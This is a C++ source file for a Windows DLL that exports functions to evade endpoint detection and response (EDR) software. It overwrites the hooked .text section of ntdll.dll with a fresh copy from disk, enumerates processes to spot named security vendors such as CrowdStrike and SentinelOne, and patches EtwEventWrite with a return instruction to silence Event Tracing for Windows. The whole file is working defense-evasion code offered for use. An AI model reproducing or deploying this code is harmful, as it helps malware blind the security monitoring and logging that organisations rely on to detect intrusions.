#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <tlhelp32.h>

class EDREvasion {
public:
    // Unhook NTDLL by mapping fresh copy from disk
    static BOOL UnhookNTDLL() {
        HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return FALSE;
        
        // Get ntdll.dll path
        CHAR ntdllPath[MAX_PATH];
        GetSystemDirectoryA(ntdllPath, MAX_PATH);
        strcat_s(ntdllPath, "\\ntdll.dll");
        
        // Load fresh ntdll.dll from disk
        HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, 
                                 NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;
        
        HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        if (!hMapping) {
            CloseHandle(hFile);
            return FALSE;
        }
        
        LPVOID pMappedDll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pMappedDll) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return FALSE;
        }
        
        // Parse PE headers
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMappedDll;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMappedDll + pDosHeader->e_lfanew);
        
        // Find .text section
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
            if (strcmp((CHAR*)pSection->Name, ".text") == 0) {
                // Overwrite hooked .text section
                DWORD oldProtect;
                VirtualProtect((LPVOID)((LPBYTE)hNtdll + pSection->VirtualAddress),
                             pSection->Misc.VirtualSize,
                             PAGE_EXECUTE_READWRITE, &oldProtect);
                
                memcpy((LPVOID)((LPBYTE)hNtdll + pSection->VirtualAddress),
                      (LPVOID)((LPBYTE)pMappedDll + pSection->PointerToRawData),
                      pSection->Misc.VirtualSize);
                
                VirtualProtect((LPVOID)((LPBYTE)hNtdll + pSection->VirtualAddress),
                             pSection->Misc.VirtualSize, oldProtect, &oldProtect);
                break;
            }
        }
        
        UnmapViewOfFile(pMappedDll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return TRUE;
    }
    
    // Remove EDR userland hooks via direct syscalls
    static BOOL BypassUserlandHooks() {
        return UnhookNTDLL();
    }
    
    // Check for EDR processes
    static std::vector<std::string> DetectEDRProcesses() {
        std::vector<std::string> edrProcesses;
        std::vector<std::string> edrNames = {
            "crowdstrike", "carbonblack", "sentinelone", "cybereason",
            "tanium", "mcafee", "symantec", "cylance"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return edrProcesses;
        
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe)) {
            do {
                std::string processName = pe.szExeFile;
                std::transform(processName.begin(), processName.end(), 
                             processName.begin(), ::tolower);
                
                for (const auto& edrName : edrNames) {
                    if (processName.find(edrName) != std::string::npos) {
                        edrProcesses.push_back(pe.szExeFile);
                        break;
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        
        CloseHandle(hSnapshot);
        return edrProcesses;
    }
    
    // Evade ETW (Event Tracing for Windows)
    static BOOL DisableETW() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return FALSE;
        
        // Overwrite EtwEventWrite function
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return FALSE;
        
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        
        // Patch with ret instruction (0xC3)
        *(BYTE*)pEtwEventWrite = 0xC3;
        
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
        return TRUE;
    }
};

extern "C" {
    __declspec(dllexport) BOOL EvadeEDR() {
        return EDREvasion::BypassUserlandHooks() && EDREvasion::DisableETW();
    }
    
    __declspec(dllexport) BOOL CheckEDRPresence() {
        auto edrProcesses = EDREvasion::DetectEDRProcesses();
        return !edrProcesses.empty();
    }
}